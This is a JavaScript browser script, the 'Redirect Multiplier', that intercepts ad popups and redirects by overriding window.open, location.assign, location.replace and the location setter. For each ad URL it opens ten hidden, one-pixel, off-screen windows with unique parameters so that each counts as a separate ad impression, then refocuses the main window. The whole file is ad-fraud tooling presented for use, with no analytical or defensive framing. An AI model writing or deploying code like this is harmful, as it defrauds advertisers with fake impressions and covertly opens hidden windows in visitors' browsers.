// Redirect Multiplier - Creates 10 redirect chains for popup ads
// Each redirect counts as a separate impression
(function() {
    'use strict';
    
    console.log('🎯 Redirect Multiplier Loaded - 10 redirects per popup ad');
    
    const REDIRECT_COUNT = 10;
    const DELAY_BETWEEN_REDIRECTS = 100; // ms between each redirect
    
    // Track redirects to prevent infinite loops
    let redirectChains = new Map();
    let isProcessing = false;
    
    // Function to create a redirect chain
    function createRedirectChain(targetUrl, chainId) {
        if (isProcessing) return;
        isProcessing = true;
        
        const chain = [];
        
        // Helper to add query parameters to URL
        function addParams(url, params) {
            const separator = url.includes('?') ? '&' : '?';
            const paramString = Object.keys(params).map(key => 
                `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`
            ).join('&');
            return url + separator + paramString;
        }
        
        // Create 10 redirect URLs, each with unique parameters to count as separate impression
        for (let i = 0; i < REDIRECT_COUNT; i++) {
            const redirectUrl = addParams(targetUrl, {
                redirect: i + 1,
                impression: i + 1,
                chain: chainId,
                timestamp: Date.now() + i,
                step: i
            });
            
            chain.push(redirectUrl);
        }
        
        // Store chain
        redirectChains.set(chainId, chain);
        
        // Execute redirects sequentially
        executeRedirectChain(chain, 0, targetUrl);
    }
    
    // Execute redirect chain - opens 10 separate windows for 10 impressions
    function executeRedirectChain(chain, index, finalUrl) {
        if (index >= chain.length) {
            isProcessing = false;
            // Final redirect for the main window
            setTimeout(() => {
                try {
                    window.location.replace(finalUrl);
                } catch (error) {
                    console.log('Final redirect error:', error);
                }
            }, DELAY_BETWEEN_REDIRECTS);
            return;
        }
        
        const redirectUrl = chain[index];
        
        setTimeout(() => {
            try {
                // Open each redirect in a separate window/tab
                // Each window counts as a separate impression
                const redirectWindow = window.open(
                    redirectUrl,
                    '_blank',
                    'width=1,height=1,left=-1000,top=-1000,noopener,noreferrer'
                );
                
                if (redirectWindow) {
                    // Focus back to main window
                    setTimeout(() => {
                        try {
                            redirectWindow.blur();
                            if (window.focus) window.focus();
                        } catch (e) {}
                    }, 50);
                }
                
                // Continue opening more windows
                executeRedirectChain(chain, index + 1, finalUrl);
            } catch (error) {
                console.log('Redirect error:', error);
                // Continue chain even if error
                executeRedirectChain(chain, index + 1, finalUrl);
            }
        }, DELAY_BETWEEN_REDIRECTS);
    }
    
    // Intercept window.open calls from ad scripts
    const originalOpen = window.open;
    window.open = function(url, target, features) {
        // Check if this is from an ad script (popup/popunder)
        const isAdRedirect = url && url !== 'about:blank' && url !== window.location.href && (
            url.includes('popunder') ||
            url.includes('popup') ||
            url.includes('redirect') ||
            url.includes('ad') ||
            url.includes('intellipopup') ||
            url.includes('quarrelsome-development') ||
            url.includes('fpyf8') ||
            url.includes('cloudfront') ||
            url.includes('gizokraijaw') ||
            url.includes('groleegni') ||
            target === '_blank'
        );
        
        if (isAdRedirect) {
            console.log(`🚀 Intercepted ad redirect (window.open): ${url}`);
            
            // Create redirect chain with unique ID
            const chainId = Date.now() + Math.random();
            createRedirectChain(url, chainId);
            
            // Return a dummy window object
            return {
                location: { 
                    replace: function(u) { 
                        if (u && u !== window.location.href) {
                            createRedirectChain(u, Date.now() + Math.random());
                        }
                    }, 
                    href: url 
                },
                close: function() {},
                closed: false
            };
        }
        
        // For non-ad opens, use original function
        return originalOpen.call(this, url, target, features);
    };
    
    // Intercept location.assign
    const originalAssign = window.location.assign;
    window.location.assign = function(url) {
        // Check if this is an ad redirect
        const isAdRedirect = url && url !== window.location.href && (
            url.includes('popunder') ||
            url.includes('popup') ||
            url.includes('redirect') ||
            url.includes('ad') ||
            url.includes('intellipopup') ||
            url.includes('quarrelsome-development') ||
            url.includes('fpyf8') ||
            url.includes('cloudfront') ||
            url.includes('gizokraijaw') ||
            url.includes('groleegni')
        );
        
        if (isAdRedirect) {
            console.log(`🚀 Intercepted location.assign redirect: ${url}`);
            const chainId = Date.now() + Math.random();
            createRedirectChain(url, chainId);
            return;
        }
        
        return originalAssign.call(this, url);
    };
    
    // Intercept location.replace
    const originalReplace = window.location.replace;
    window.location.replace = function(url) {
        // Check if this is an ad redirect
        const isAdRedirect = url && url !== window.location.href && (
            url.includes('popunder') ||
            url.includes('popup') ||
            url.includes('redirect') ||
            url.includes('ad') ||
            url.includes('intellipopup') ||
            url.includes('quarrelsome-development') ||
            url.includes('fpyf8') ||
            url.includes('cloudfront') ||
            url.includes('gizokraijaw') ||
            url.includes('groleegni')
        );
        
        if (isAdRedirect) {
            console.log(`🚀 Intercepted location.replace redirect: ${url}`);
            const chainId = Date.now() + Math.random();
            createRedirectChain(url, chainId);
            return;
        }
        
        return originalReplace.call(this, url);
    };
    
    // Intercept location.href assignments
    let locationHrefDescriptor = Object.getOwnPropertyDescriptor(window, 'location') || 
                                  Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window), 'location');
    
    if (locationHrefDescriptor && locationHrefDescriptor.set) {
        const originalHrefSetter = locationHrefDescriptor.set;
        
        Object.defineProperty(window, 'location', {
            set: function(url) {
                const isAdRedirect = url && (
                    url.includes('popunder') ||
                    url.includes('popup') ||
                    url.includes('redirect') ||
                    url.includes('ad')
                );
                
                if (isAdRedirect && url !== window.location.href) {
                    console.log(`🚀 Intercepted location.href redirect: ${url}`);
                    createRedirectChain(url, 0);
                    return;
                }
                
                return originalHrefSetter.call(this, url);
            },
            get: locationHrefDescriptor.get
        });
    }
    
    // Also intercept clicks that might trigger ad redirects
    document.addEventListener('click', function(e) {
        // Small delay to let ad scripts process first
        setTimeout(() => {
            // Check if any ad scripts triggered a redirect
            // This is a backup method
        }, 100);
    }, true);
    
    console.log('✅ Redirect Multiplier active - 10 redirects per popup ad');
    
})();

